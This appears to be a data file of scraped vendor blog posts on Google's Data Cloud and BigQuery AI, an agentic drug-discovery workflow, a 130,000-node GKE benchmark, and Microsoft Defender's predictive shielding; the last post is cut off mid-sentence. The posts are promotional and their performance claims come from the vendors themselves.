      "summary": "Google is a Leader in the 2025 Gartner Magic Quadrant for Cloud Database Management Systems for the sixth year in a row, and for the third consecutive year is positioned furthest in vision. This comes as we cross into the era of agentic AI. Leading enterprises are in the early days of deploying agents to automate core business functions. At the center is data, the fuel for AI. This recognition from Gartner \u2014 especially our placement for Completeness of Vision \u2014 in our opinion validates our long-standing belief that the future of enterprise data is unified, open, and inseparable from the AI layer. This is the blueprint for what we call the AI-native Data Cloud. The AI-native Data Cloud is the only architecture engineered from the ground up to eliminate the complexity and hidden cost of the agentic era. Those who learn to apply the power of agents today will be the winning businesses of tomorrow. A data and AI foundation for the agentic enterprise Your organization\u2019s ability to take advantage of AI will depend on your enterprise data strategy. Agents require a new data foundation that combines analytical platforms for their rich historical petabytes of data with high-performance transactional databases for real-time actions. Agents need to be firmly grounded in governed, enterprise data so that they can generate trustworthy output. Siloed, fragmented data stacks struggle to offer these capabilities. Google\u2019s Data Cloud is anchored by the integration of BigQuery as the analytical engine, databases such as Spanner and AlloyDB for operational processing, Looker for business intelligence, and Dataplex Universal Catalog for data management and governance. It is designed with a single, unified vision where operational, analytical, and AI systems co-process as one native fabric. With AI infused in every layer, the platform automates tasks across the entire data lifecycle. Grounded in business context and enterprise data, it delivers trusted intelligence at scale. This active foundation continuously adapts with real-time intelligence, empowering teams to build next-generation intelligent applications and agentic experiences, while minimizing complexity. Let's review three benefits enterprises realize when they operate on a unified, AI-native Data Cloud, along with our latest innovations to help you thrive in the agentic era. Accelerate time to market with autonomous design To move quickly in the agentic era, your organization must remove manual processes that separate data from AI-driven actions. Our AI-native Data Cloud brings the power of AI directly to your data to fuel autonomous, agentic systems. This is timely, as customers are increasingly shifting to AI-driven workflows, as evidenced by a 27x increase in the volume of data processed in BigQuery with Gemini. We are delivering on this vision by embedding a set of specialized agents directly into the platform. We provide a specialized, autonomous data agent for every kind of data user \u2014 from data scientists and engineers to business analysts. These include the Data Engineering Agent to automate complex pipelines, the Data Science Agent to execute ML modeling without manual setup, and the Conversational Analytics Agent to empower any user in your organization to get answers using natural language. These agents form a collaborative AI agent network that can power end-to-end data workflows. Your developers also have the tools they need to build agents tailored to your specific business processes, for example, the new Data Agents API and Agent Development Kit (ADK) . Gemini CLI extensions allow data teams to use natural language for complex analysis, and Agent Analytics in BigQuery , built using ADK, lets you capture, analyze, and visualize agent performance, user interaction, and their associated costs. These capabilities deliver business results. Lowe's implemented an AI-first strategy on Google\u2019s Data Cloud for their e-commerce site and mobile application to improve product discovery for customers who shop with a visual preference. Now customers can now find visually similar products, resulting in more than $15 million in incremental annualized revenue for home decor items and increased sales conversion rates. Control operational costs on a single governed foundation Data fragmentation can contribute to high AI costs. Google\u2019s Data Cloud is an integrated platform that connects all your operational and analytical workloads, including easy integration with Vertex AI, our platform for building AI models and agents. This minimizes redundant data movement and storage and creates a more efficient economic model. In fact, according to our analysis, it can be eight to 16 times more cost-efficient to run data and AI workloads on the single BigQuery and Vertex AI platform rather than on separate, disconnected systems. In the age of agents, trust and compliance are paramount. Disconnected data and AI have the potential for significant governance risk: the threat of data leakage, agent hallucinations, biased outcomes, and regulatory non-compliance. Effective governance helps ensure these agents\u2019 integrity. At the same time, the platform's governance and knowledge engine creates an active AI catalog across your cloud estate, providing you with a deep understanding of your data environment. AI agents can use this catalog to identify the correct datasets to use with over 50% greater accuracy than traditional methods, reducing errors and improving trust. We continue to deliver new features that reinforce this foundation. For instance, with AI, context is everything, but providing that context can be complicated when you\u2019re training agents on multimodal data such as text, video, and images. To help, we\u2019ve unified a full range of AI capabilities within BigQuery. Whether you want to build machine learning models, process massive amounts of unstructured data with generative AI, or build retrieval augmented generation (RAG) applications using vector embeddings and hybrid search , you can now do it directly where your data lives. Spanner\u2019s vector search , meanwhile, ties together complex multimodal queries, letting your teams consolidate full text search, graph, and vector workloads onto a single system. At the same time, autonomous, mission-critical applications such as ones that rely on real-time financial transactions or perform global inventory updates need to be built on a proven database. Spanner\u2019s new columnar engine unifies transactional and analytical processing, with analytical queries running up to 200x faster on live operational data. Google (Spanner) ranked in the highest three across all use cases in the 2025 Gartner Critical Capabilities for Operational Cloud DBMS report, including #1 in Lightweight Transactions. And Google (BigQuery) ranked #1 for the Event Analytics use case in the 2025 Gartner Critical Capabilities for Analytical Cloud DBMS report, which in our opinion underscores our ability to deliver the real-time data processing required for high-performance, autonomous systems. You can see the strategic advantage of a unified, governed foundation in Banco BV's modernization effort. The company migrated from Databricks to Google Cloud to enhance governance, scale their data infrastructure, and meet increasing customer demands, all while strictly managing security. By migrating, centralizing data management, and accelerating AI model testing, they aim to improve business output by 100%. Future-proof your architecture with an open platform To ensure their long-term viability and prevent vendor lock-in, your AI investments need a foundation built on open standards. An open platform gives your teams the flexibility to modernize your data ecosystem and build AI-powered systems that can process data across any cloud environment. This approach resolves the trade-off between the flexibility of a data lake and the performance of a data warehouse. We deliver on the promise of open platform innovation by prioritizing speed, security, and flexibility. AlloyDB is more than four times faster for transactional workloads and provides up to two times better price-performance compared to self-managed PostgreSQL. Plus, you can run it anywhere with AlloyDB Omni, enabling multi and hybrid cloud environments. For your critical Spark workloads, we deliver high performance with Lightning Engine for Apache Spark , now generally available. This engine improves Spark performance by more than four times compared to open-source Spark and it delivers 10% faster query execution than Databricks Photon. Then, to future-proof your data estate, we keep everything accessible and interoperable through BigLake , our management layer that acts as a unifying fabric for your open data. Our support for open formats, including the recent general availability of the Apache Iceberg REST Catalog, helps your data stay accessible and ready for your future needs. Our commitment to open innovation is shown by Deutsche Telekom , who modernized over 40 legacy data systems into a \"One Data Ecosystem\" on Google Cloud to meet stringent German data sovereignty regulations. By using Sovereign Cloud and Apache Iceberg as the core open platform, they established a unified, compliant architecture that provides a single source of truth across services like BigQuery and Spanner, resulting in a 22x performance boost for a key use case.

      "title": "Four agentic workflows you can build for life sciences for R&D",
      "summary": "AI agents, powered by generative AI, are rapidly transforming industries by acting as intelligent, collaborative partners that can interpret goals, plan multi-step actions, and work independently across systems, marking a significant shift in how businesses can find, understand, and act on their data. Our recent blog outlines how AI agents are transforming several industries. Below we describe how to create a modular, end-to-end platform that accelerates the discovery and preclinical optimization of novel therapeutic candidates through a multi-agentic system. The system is designed to move from a high-level disease concept to a set of lead candidates with a high probability of success, regardless of the specific disease or therapeutic modality. We see few key roles to be played by specialized AI agents, each based on a specialized open-weight model from Google, which can in turn be fine-tuned and trained for even more specialized purposes. Given the below agents are all based on open weight models, it gives a lot of room to further fine tune and train these models to build powerful agents. Four agents you can build for life sciences 1. MedGemma: \"The strategic intelligence agent\" Expertise: Deep comprehension and synthesis of unstructured biomedical text, medical imaging, clinical data, and scientific literature. Function: Acts as a specialized knowledge agent. When directed by the Cognitive Orchestrator, it executes deep search and synthesis across biomedical corpora (e.g., PubMed, patient text records, other modalities such as chest x-rays) to extract findings, build cohorts, and summarize knowledge. MedGemma is especially useful for use cases requiring strict version control (e.g. regulated products), lower inference costs, or requiring substantial adaptation to specific use cases. Additionally its fast performance and efficient cost makes it very suitable for high volume medical use cases where speed and cost are of importance, a lot of those use cases are very common in LifeSciences 2. TxGemma: \"The preclinical analyst\" Expertise: Predicting functional and safety properties of therapeutic molecules Function: Predicts preclinical properties of drug candidates in silico , such as pharmacokinetics, permeability, toxicity, or efficacy. TxGemma Blog 3. Gemini 2.5 Pro: \"The cognitive orchestrator agent\" Expertise: Advanced multi-step reasoning, dynamic planning, and contextual understanding to manage the end-to-end drug discovery workflow. Function: Directs the specialized AI agents by interpreting high-level goals, sequencing tasks, evaluating results, and dynamically adapting the workflow to help the scientists achieve the final therapeutic objective.This orchestrator also accesses various tools. A tool can be a complete, specialized agent (like MedGemma) or a specific model endpoint (like AlphaFold) , and is given a clear, natural language description of its function. For example, the MedGemma tool might be used as: \" A tool that searches and synthesizes biomedical literature to identify potential disease targets based on a given pathology. \" Note: For uses cases needing a version locked model and change control users have the option of using Gemma (Open Source) for this orchestration 4. AlphaFold-2 & molecular docking tools: \"The molecular architect\" Expertise: Predicting the precise 3D structure of molecular targets and simulating how candidate molecules physically interact (dock) with them. Function: Creates the essential structural blueprint of the drug-target interaction, enabling structure-based design, virtual screening, and specificity analysis Here\u2019s the step-by-step process Phase 1: Find the target A scientist prompts the system (e.g., \"Find novel targets for Parkinson's\"). The MedGemma agent (\"AI Research Analyst\") instantly scans millions of publications and clinical data to identify promising biological targets. The Orchestrator delivers a concise report, and the scientist approves the final target. Phase 2: Generate candidates The AlphaFold agent (\"Molecular Architect\") builds a 3D model of the target. Then, the TxGemma agent performs virtual screening, testing thousands of potential drug \"keys\" to see how they \"fit\" the target \"lock,\" creating a shortlist of candidates. Phase 3: The \"Design-test-refine\" loop This is the core engine for rapidly improving candidates. Predict: TxGemma (\"Preclinical Analyst\") runs a virtual simulation on each candidate, predicting its real-world performance (e.g., potency, toxicity). Triage: The Orchestrator sorts them: \"Promote\" (looks excellent), \"Archive\" (a dead end), or \"Optimize\" (promising, but flawed). Refine: \"Optimize\" candidates are automatically refined to fix their specific flaw and are sent right back into the loop. This Design -> Dock -> Predict -> Refine cycle runs thousands of times on Google Cloud's high-performance computing, iterating on drug designs at a speed impossible in a physical lab. Phase 4: Nominate lab-ready leads After the loop, the Orchestrator presents the human scientist with the final, highly-optimized lead candidates. The scientist makes the final selection, and MedGemma re-engages to help design the optimal strategy for real-world lab testing. By moving the costly \"test-and-fail\" part of discovery into this rapid, in-silico workflow, we can focus our lab resources on candidates with the highest probability of success, creating a faster, more intelligent path to new therapies. Reference architecture This diagram shows the foundational services and how data flows between them and how services work together. Executing this sophisticated, iterative workflow requires a robust, scalable, and secure cloud platform. Google Cloud provides a comprehensive suite of services that map directly to the needs of each AI agent and the overall workflow, ensuring data integrity, compliance, and computational power. How to get started using Google Cloud Vertex AI Search is the core service for this agent's function. It can create a sophisticated Retrieval-Augmented Generation (RAG) system over a corpus of private biomedical data, such as internal research documents, PubMed literature, and clinical trial data. This directly enables the agent to answer natural language queries and synthesize information with citations. Vertex AI . Google Cloud offers managed, optimized AlphaFold environments and integrations. For high-throughput needs, Vertex AI Training with GPU or TPU acceleration can run thousands of protein folding and docking simulations in parallel. Use Vertex AI Agent Builder to create agents.

      "title": "BigQuery AI: The convergence of data and AI is here",
      "summary": "From uncovering new insights in multimodal data to personalizing customer experiences, AI is emerging as the engine of modern innovation. The explosion in AI adoption has created a need to bring data and AI closer \u2014 not only to streamline the AI lifecycle, but also to bring AI-driven insights and workflow automation to everyone in the organization. We created BigQuery ML to bring AI to your data, enabling data scientists and data analysts to build and deploy machine learning models directly inside BigQuery. Over the years, we built on this foundation by introducing capabilities such as AI-powered search, generative AI with SQL and many others. Today, we\u2019re introducing BigQuery AI , which brings together BigQuery\u2019s built-in ML capabilities, generative AI functions, vector search, intelligent agents, and agent tools. Using BigQuery AI, you can: Apply gen AI to your data : Bring Google and partner AI models directly to your multimodal data in BigQuery through simple SQL functions. Simplify your data-to-ML journey: Manage your whole machine learning lifecycle in BigQuery \u2014 everything from feature engineering to model training, tuning, inferencing and monitoring, all without moving your data. Create workflows and apps faster: Whether you\u2019re a data engineer, data scientist, or business user, you can accelerate your workflows with intuitive, role-specific agents built right into BigQuery. Let\u2019s take a closer look at the tools and technologies that fall under the BigQuery AI umbrella. Unlock insights from multimodal data with generative AI Bringing state-of-the-art AI models directly to your data through simple SQL commands can help you perform generative AI tasks as well as unlock deeper, semantic understanding from your multimodal data. AI functions integrate LLMs and embedding models directly into your SQL queries, enabling you to perform tasks such as content generation, analysis, summarization, structured data extraction, classification, embedding generation, and data enrichment. You can also use AI functions for routine tasks such as filtering, rating, and classification. With managed AI functions , BigQuery chooses a model for you that is optimized for cost and quality. Embeddings and search functions help you find information more intelligently. Traditional text search lets you quickly locate specific keywords in your data, but vector search allows you to search by meaning and context, not just exact words. This helps you uncover conceptually related items, finding relevant information that a simple keyword search would miss. Embeddings and vector search in BigQuery power use cases such as RAG, multimodal search, data deduplication, clustering and recommendation engines. Data processing to AI inference all under one roof When we first launched BigQuery ML, our goal was to bring AI and ML closer to your data, empowering SQL users to perform machine learning tasks directly in BigQuery, on their BigQuery data. Over the years, we added capabilities to provide a complete, end-to-end platform for accelerating the entire machine learning lifecycle. Enterprises are using these capabilities to powerful effect. For instance, PUMA used BigQuery's integrated machine learning capabilities to advance beyond manual segmentation, crafting sophisticated audience segments based on purchase propensity. The outcome was hugely impactful: the top ML-derived audience segments demonstrated a remarkable 149.8% surge in click-through rate, a 4.6% uptick in conversion rate, and a 6% increase in average order value. Data processing to AI inference workflow in BigQuery BigQuery AI streamlines the entire machine learning lifecycle by bringing the code to your data. No data movement: Train and run models directly in BigQuery using SQL or Python. No data movement or infrastructure management needed. End-to-end lifecycle: Handle everything from feature engineering to model training, evaluation, tuning , deployment and inference in BigQuery without needing expertise in specialized ML frameworks. Model flexibility: Choose from built-in models, import custom models you have trained in AI, or use pre-trained models (like TimesFM) for zero-shot inference. Unified inference: Seamlessly execute predictions via batch processing, real-time streaming, or remote inference. And of course, BigQuery AI lets you use your preferred development environment \u2014 BigQuery Studio, the integrated AI-powered Colab Enterprise notebook , or an IDE of your choice. Agentic experience for every data user Under the BigQuery AI umbrella, we are also consolidating the data agents and assistive AI capabilities that are designed to streamline and automate workflows for various data professionals. Data Engineering Agent allows you to build, modify, and manage data pipelines by describing your requirements in natural language. It translates your plain-language requests into production-ready SQL code, automating complex tasks like data cleaning, transformations, and schema modeling. Data Science Agent helps automate end-to-end data science workflows. It creates multi-step plans, generating and executing code, reasons about the results, and presents its findings. You also use it to generate visualizations with simple prompts, explain and transform code, as well as explain errors and fix them automatically. Conversational Analytics Agent empowers business users to bypass technical barriers, allowing them to ask questions in natural language and receive clear, actionable intelligence, truly democratizing data for all. Assistive AI features like data canvas and code completion simplify and speed up routine tasks. Beyond first-party agents and assistive AI capabilities, BigQuery also provides a powerful suite of tools for building custom agents and integrating agentic AI into your applications. The Conversational Analytics API provides the building blocks to embed natural language processing capabilities into your own products for tailored data experiences. And for more advanced use cases, the Agent Development Kit (ADK) offers a full-stack framework to build and deploy complex, multi-agent systems, while the Model Context Protocol (MCP) standardizes how AI models communicate with databases and other tools. AI is changing how we all live and work, and nowhere is that more apparent than in how data professionals are approaching their jobs. BigQuery AI is a significant leap forward in how you can connect your data to AI. To learn more about BigQuery AI and get started with it, check out this guide .

      "title": "How Google Does It: Building the largest known Kubernetes cluster, with 130,000 nodes",
      "summary": "At Google Cloud, we\u2019re constantly pushing the scalability of Google Kubernetes Engine (GKE) so that it can keep up with increasingly demanding workloads \u2014 especially AI. GKE already supports massive 65,000-node clusters , and at KubeCon, we shared that we successfully ran a 130,000-node cluster in experimental mode \u2014 twice the number of nodes compared to the officially supported and tested limit. This kind of scaling isn't just about increasing the sheer number of nodes; it also requires scaling other critical dimensions, such as Pod creation and scheduling throughput . For instance, during this test, we sustained Pod throughput of 1,000 Pods per second , as well as storing over 1 million objects in our optimized distributed storage. In this blog, we take a look at the trends driving demand for these kinds of mega-clusters, and do a deep dive on the architectural innovations we implemented to make this extreme scalability a reality. The rise of the mega cluster Our largest customers are actively pushing the boundaries of GKE\u2019s scalability and performance with their AI workloads. In fact, we already have numerous customers operating clusters in the 20-65K node range, and we anticipate the demand for large clusters to stabilize around the 100K node mark. This sets up an interesting dynamic. In short, we are transitioning from a world constrained by chip supply to a world constrained by electrical power. Consider the fact that a single NVIDIA GB200 GPU needs 2700W of power. With tens of thousands, or even more, of these chips, a single cluster's power footprint could easily scale to hundreds of megawatts \u2014 ideally distributed across multiple data centers. Thus, for AI platforms exceeding 100K nodes, we\u2019ll need robust multi-cluster solutions that can orchestrate distributed training or reinforcement learning across clusters and data centers. This is a significant challenge, and we\u2019re actively investing in tools like MultiKueue to address it, with further innovations on the horizon. We are also advancing high-performance RDMA networking with the recently announced managed DRANET , improving topology awareness to maximize performance for massive AI workloads. Stay tuned. At the same time, these investments also benefit users who operate at more modest scales \u2014 the vast majority of GKE customers. By hardening GKE's core systems for extreme usage, we create substantial headroom for average clusters, making them more resilient to errors, increasing tolerance for user misuse of the Kubernetes API, and generally optimizing all controllers for faster performance. And of course, all GKE customers, large and small, benefit from investments in an intuitive, self-service experience. Key architectural innovations With that said, achieving this level of scale requires significant innovations throughout the Kubernetes ecosystem, including control plane, custom scheduling and storage. Let\u2019s take a look at a few key areas that were critical to this project. Optimized read scalability When operating at scale, there\u2019s a need for a strongly consistent and snapshottable API server watch cache. At 130,000 nodes, the sheer volume of read requests to the API server can overwhelm the central object datastore. To solve this, Kubernetes includes several complementary features to offload these read requests from the central object datastore. First, the Consistent Reads from Cache feature (KEP-2340), detailed in here , enables the API server to serve strongly consistent data directly from its in-memory cache. This drastically reduces the load on the object storage database for common read patterns such as filtered list requests (e.g., \"all Pods on a specific node\"), by ensuring the cache's data is verifiably up-to-date before it serves the request. Building on this foundation, the Snapshottable API Server Cache feature (KEP-4988) further enhances performance by allowing the API server to serve LIST requests for previous states (via pagination or by specifying resourceVersion ) directly from that same consistent watch cache. By generating a B-tree \"snapshot\" of the cache at a specific resource version, the API server can efficiently handle subsequent LIST requests without repeatedly querying the datastore. Together, these two enhancements address the problem of read amplification, ensuring the API server remains fast and responsive by serving both strongly consistent filtered reads and list requests of previous states directly from memory. This is essential for maintaining cluster-wide component health at extreme scale. An optimized distributed storage backend To support the cluster\u2019s massive scale, we relied on a proprietary key-value store based on Google\u2019s Spanner distributed database. At 130K nodes, we required 13,000 QPS to update lease objects, ensuring that critical cluster operations such as node health checks didn\u2019t become a bottleneck, and providing the stability needed for the entire system to operate reliably. We didn\u2019t witness any bottlenecks with respect to the new storage system and it showed no signs of it not being able to support higher scales. Kueue for advanced job queueing The default Kubernetes scheduler is designed to schedule individual Pods, but complex AI/ML environments require more sophisticated, job-level management. Kueue is a job queueing controller that brings batch system capabilities to Kubernetes. It decides *when* a job should be admitted based on fair-sharing policies, priorities, and resource quotas, and enables \"all-or-nothing\" scheduling for entire jobs. Built on top of the default scheduler, Kueue provided the orchestration necessary to manage the complex mix of competing training, batch, and inference workloads in our benchmark. Future of scheduling: Enhanced workload awareness Beyond Kueue's job-level queueing, the Kubernetes ecosystem is evolving towards workload-aware scheduling in its core. The goal is to move from a Pod-centric to a workload-centric approach to scheduling. This means the scheduler will make placement decisions considering the entire workload's needs as a single unit, encompassing both available and potential capacity. This holistic view is crucial for optimizing price-performance, especially for the new wave of AI/ML training and inference workloads. A key aspect of the emerging kubernetes scheduler is the native implementation of gang scheduling semantics within Kubernetes, a feature currently provided by add-ons like Kueue. The community is actively working on this through KEP-4671: Gang Scheduling . In time, support for workload-aware scheduling in core Kubernetes will simplify orchestrating large-scale, tightly coupled applications on GKE, making the platform even more powerful for demanding AI/ML and HPC use cases. We\u2019re also working on integrating Kueue as a second-level scheduler within GKE. GCS FUSE for data access AI workloads need to be able to access data efficiently. Together, Cloud Storage FUSE with parallel downloads and caching enabled and paired with the zonal Anywhere Cache , allowing access to model data in Cloud Storage buckets as if it were a local file system, reducing latency up to 70%. This provides a scalable, high-throughput mechanism for feeding data to distributed jobs or scale-out inference workflows. Alternatively, there\u2019s Google Cloud Managed Lustre , a fully managed persistent zonal storage solution that supports workloads that need multi-petabyte capacity, TB/s throughput, and sub-millisecond latency. You can learn more about your storage options for AI/ML workloads here . Benchmarking GKE for large-scale, dynamic AI workloads To validate GKE's performance with large-scale AI/ML workloads, we designed a four-phase benchmark simulating a dynamic environment with complex resource management, prioritization, and scheduling challenges. This builds on the benchmark used in the previous 65K node scale test . We upgraded the benchmark to represent a typical AI platform that hosts mixed workloads, using workloads with distinct priority classes: Low Priority: Preemptible batch processing, such as data preparation jobs. Medium Priority: Core model training jobs that are important but can tolerate some queuing. High Priority: Latency-sensitive, user-facing inference services that must have resources guaranteed. We orchestrated the process using Kueue to manage quotas and resource sharing, and JobSet to manage training jobs. Phase 1: Establishing a performance baseline with a large training job To begin, we measure the cluster's foundational performance by scheduling a single, large-scale training workload. We deploy one JobSet configured to run 130,000 medium-priority Pods simultaneously. This initial test allows us to establish a baseline for key metrics like Pod startup latency and overall scheduling throughput, revealing the overhead of launching a substantial workload on a clean cluster. This set the stage for evaluating GKE's performance under more complex conditions. After execution, we removed this JobSet from the cluster, leaving an empty cluster for Phase 2. Figure 1: Phase 1: Establishing a performance baseline by deploying a massive pre-training workload of 130,000 Pods on a clean cluster. Phase 2: Simulating a realistic mixed-workload environment Next, we introduced resource contention to simulate a typical MLOps environment. At first, we deployed 650 low-priority batch Jobs (totaling 65,000 Pods), filling up half of the capacity of the cluster\u2019s 130K nodes. Figure 2: Phase 2: Simulating a realistic MLOps environment by introducing 65,000 low-priority batch job Pods to fill 50% of cluster capacity. Then we introduced 8 large, medium-priority fine-tuning Jobs (totaling 104,000 Pods), taking 80% of the cluster capacity, and preempting 60% of the batch workloads (which represents 30% of total cluster capacity). This phase tested GKE\u2019s ability to manage mixed workloads, as well preemption within a mixed workloads environment. In this scenario, we observed Kueue in action, preempting existing workload and gang-scheduling a large number of batch jobs all at once to allow for fine-tuning jobs to be scheduled. This highlighted Kueue's advantage over kube-scheduler: preemption happens much faster, and switching between workloads is almost instantaneous. Figure 3: Kueue in action: Preempting low-priority batch workloads to accommodate 104,000 Pods for higher-priority fine-tuning jobs. Phase 3: Prioritizing and scaling a latency-sensitive inference service In this phase, we simulated the arrival of a critical inference service by deploying a high-priority Job , totalling 26K Pods, or 20% of the capacity. To accommodate it, Kueue preempted the remaining low-priority batch jobs . Figure 4: Phase 3: Prioritizing a critical, latency-sensitive inference service (26,000 Pods) by preempting the remaining of lower-priority batch jobs. We then scaled the inference workload to simulate a spike in traffic, first, preempting part of the medium-priority fine-tuning jobs. The inference workload scaled up to a total of 52,000 Pods, representing 40% of the capacity. Once fully scaled, we ran a 10-minute traffic simulation to measure performance under load. Figure 5: Simulating a traffic spike. Scaling the inference workload to 52,000 Pods (40% capacity) triggers partial preemption of fine-tuning jobs. Phase 4: Validating cluster elasticity and resource recovery Finally, we evaluated the cluster's ability to efficiently recover and reallocate resources once peak demand was over. We scaled down the high-priority inference workload by 50% , returning to its original initial phase. This demonstrated GKE\u2019s elasticity, ensuring that valuable compute resources were not left idle as workload demands change, thereby maximizing utilization and cost-efficiency. Again, Kueue took care of admitting back the preempted fine-tuning workloads that were waiting in the cluster queue. Figure 6: Phase 4: Demonstrating cluster elasticity by scaling down the inference workload and automatically recovering resources for pending fine-tuning jobs. With the benchmark concluded, the resulting data paints a clear picture of how GKE handles extreme-scale pressure. Demonstrating GKE\u2019s scalability across dimensions The four benchmark phases tested multiple performance dimensions. In Phase 1, the cluster scaled to 130,000 Pods in 3 minutes and 40 seconds. In Phase 2, the low-priority batch workloads were created in 81 seconds, an average throughput of around 750 Pods/second. Below is a diagram showing the execution timeline of the workload, highlighting the various phases of the benchmark. Figure 7: Execution timeline highlighting the four distinct phases of the large-scale AI workload benchmark. Overall, the benchmark demonstrated GKE's ability to manage fluctuating demands by preempting lower-priority jobs to make room for critical training and inference services, showcasing the cluster's elasticity and resource reallocation capabilities. Figure 8: Total number of running workload Pods over time, demonstrating GKE's ability to maintain high utilization through dynamic preemption and resource reallocation. Intelligent workload management with Kueue For this benchmark, Kueue was a critical component for enabling workload prioritization. In Phase 2, Kueue preempted 60% of the batch workloads (30% of the cluster capacity) to make room for medium-priority jobs, with the remainder preempted in Phase 3 for the high-priority inference workload. This simulation of urgent tasks taking precedence is a common operational scenario, and this large-scale preemption highlights how the combination of GKE and Kueue can dynamically allocate resources to the most critical jobs. At its peak in Phase 2, 39,000 Pods were preempted in 93 seconds. The Pod churn during the preemption of batch workloads and admission and creation of fine-tuning workloads reached a median of 990 and an average of 745 Pods/s, as seen below. Figure 9: API request throughput during preemption events, showing a mix of POST and DELETE requests averaging Pod churn of 745 Pods per second. Checking the status of the admitted vs. evicted workloads from Kueue shows that many batch workloads were initially admitted, only to be preempted later by fine-tuning and later inference workloads. Figure 10: Workload status over time, visualizing the volume of jobs admitted versus those preempted (evicted) by Kueue as priorities shifted. Blazing-fast scheduling at 1,000 pods/second The key measure of Kubernetes\u2019 control-plane performance is its ability to create and schedule Pods quickly. Throughout the benchmark, especially during the most intense phases, GKE consistently achieved and sustained a throughput of up to 1,000 operations per second for both Pod creation and Pod binding (the act of scheduling a Pod to a node). Figure 11: Control plane throughput: Sustaining up to 1,000 operations per second for both Pod creation and Pod binding during intense scheduling phases. Figure 12: Detailed pod-creation throughput statistics (Average, Max, P50, P90, P99) across large pre-training, batch, and fine-tuning workloads. Low pod startup latency At the same time, pod-creation throughput was matched by low Pod-startup latencies across all workload types. For latency-sensitive inference workloads, the 99th percentile (P99) startup time was approximately 10 seconds, ensuring services could scale quickly to meet demand. Figure 13: Pod startup latency across workload types. Control plane stability under extreme load GKE\u2019s cluster control plane remained stable throughout the test. The total number of objects in a single database replica exceeded 1 million at its peak, while API server latencies for critical operations remained well below their defined thresholds. This confirms that the cluster can remain responsive and manageable even at this scale. Figure 14: API Server latency for GET and LIST operations, remaining stable and well below defined thresholds, and despite the cluster\u2019s massive scale. Figure 15: API request duration broken down by verb (GET, POST, PUT, PATCH, DELETE), confirming consistent response times under load. Figure 16: Duration for LIST operations specifically, remaining stable throughout the benchmark phases. Figure 17: Total count of Kubernetes objects (including Pods, Leases, and Nodes) in the database, exceeding 1 million objects. Destination: Massive scale All told, this experiment demonstrated that GKE can support AI and ML workloads at a scale well beyond current public limits. Further, the insights we gained from operating at this scale are helping us plan the GKE\u2019s future development.While we don\u2019t yet officially support 130K nodes, we're very encouraged by these findings.

      "title": "Ignite 2025: Microsoft Defender now prevents threats on endpoints during an attack",
      "summary": "This year at Microsoft Ignite, Microsoft Defender is announcing exciting innovations for endpoint protection that help security teams deploy faster, gain more visibility, and proactively block attackers during active attacks: Predictive shielding: Defender is the first security solution to not only respond instantly during an attack but also jump ahead of attackers, predicting and preventing the next move before it happens with just-in-time hardening controls that block specific attacker techniques to protect critical assets. Custom data collection: Defender is now the only endpoint protection solution that allows data-hungry security teams to meet specific telemetry needs by optimizing their data collection right within the Defender portal, without the need to rely on fragmented and siloed solutions. Expanded Defender support for legacy Windows devices: Better protect vulnerable legacy devices with consistent OS support of Microsoft Defender capabilities across Windows 7 & Windows 2008 R2 and higher. Defender deployment tool: Streamline the onboarding process with a lightweight tool that dynamically adapts to the operating system, delivering healthy endpoint security to a diverse estate of Windows and Linux devices. Video: Check out what's new in endpoint protection with Defender Jump ahead of attackers: autonomous defense, real results Automatic attack disruption is a capability unique to Microsoft Defender that contains attacks wherever they appear in your environment. It automatically detects and disrupts in-progress attacks with over 99% confidence, disrupting ransomware in an average of 3 minutes. In recent months, it disabled nearly half a million compromised accounts while saving over 270,000 devices. But today\u2019s landscape is relentless: over 80% of advanced attacks are multi-stage and persistent, forcing defenders to be perfect over and over again. Even in the face of this incessant threat, the industry-wide approach of reactively responding to attacks is accepted as the best we can do. Until now. Today we are thrilled to move the bounds of endpoint protection by introducing predictive shielding , a groundbreaking, proactive capability of attack disruption. It acts in two steps: 1. As soon as a compromised asset is contained, Defender predicts the attack paths and tactics the adversary will use next, in many cases narrowing down tens of thousands of possible pathways to just a few with the highest likelihood. Image 1: Defender predicts the path and tactics an attacker will use 2. Then, it jumps ahead of the attacker and shields those pathways by using just-in-time hardening methods, giving the attacker nowhere to go. Image 2: Defender shields the path with just-in-time hardening tactics So how can Defender do this when no one else can? It comes down to a combination of our unique visibility, leading threat intelligence, and AI-powered innovation. Defender uses AI technology to analyze the attack as it\u2019s happening, identifying patterns of known attackers based on Microsoft\u2019s deep threat intelligence, and then applies that to our unique understanding of the organization\u2019s environment based on graph insights and integration as part of the Microsoft platform. With all this context, Defender can identify common attack techniques, which assets they\u2019re trying to get to, and how they\u2019ll try to get there. Based on these insights, Defender deploys innovative hardening capabilities that block specific attacker tactics and turn on as the attack is underway, just before an attacker attempts to use those tactics. Today we are starting with hardening capabilities seen in sophisticated ransomware campaigns, including group policy objects (GPO), safe mode reboot for tampering, and domain account compromise. While the precision of predictive shielding allows us to block operations surgically, security teams remain in command, with full visibility and control. All collected data and predictive shielding actions are available for investigation in the Defender portal, with controls that allow security teams to turn off hardening tactics with one click. Image 3: The Defender portal provides full visibility into predictive shielding actions, with the option to turn them off Ready to see the future of autonomous defense? Join us online or in person for our Microsoft Ignite session on November 20 th . See the data you want to see, right in Defender Security teams today are data savvy and are always looking for full visibility into their telemetry. Defender has long provided over 200 types of raw event types, each enriched with numerous properties and accessible through the threat hunting experience in the Defender portal. But each organization has unique data requirements, so many security teams use complex add-on products to collect and analyze additional data, contributing to the already overwhelming number of solutions they\u2019re using. That\u2019s why today we\u2019re announcing the ability to collect and hunt across custom data right within the Defender portal. You can now easily build custom data collection rules based on your organization\u2019s specific needs using natural language; no PhD required! We are releasing several new data types that can be collected, for example the highly requested AMSI for hunting over script content, and Kerberos for hunting auth-based and network attacks. Image 4: Easily create custom data collection rules in the Defender portal This truly integrated custom data offering is possible thanks to Microsoft\u2019s platform approach, as the additional telemetry can be collected and analyzed via Defender and stored via Microsoft Sentinel. This expansion puts you in complete control of any customized, add-on data, including exactly which data types are collected and how long they are stored. No other security solution has fully integrated and customizable telemetry collection and analysis. Expanded support for Windows 7 and 2008 R2 Upgrading to the latest versions of each operating system as soon as possible is critical to optimize your security, but we understand that this is simply not realistic for many organizations. Our data shows that more than 90% of enterprises continue to have at least some legacy devices in their environment. Attackers know they present gaps in even the tightest security posture. That\u2019s why today we are improving Defender\u2019s coverage with expanded support for Windows 7 and Windows 2008 R2 to help you keep your legacy systems protected. We know that many organizations have Windows 7 and 2008 R2 in their environments, and it\u2019s a critical milestone for us to support customers in bringing a consistent endpoint protection capability set across OS versions with Microsoft Defender. Image 5: Operating system coverage with Microsoft Defender This new release further expands Defender support to the 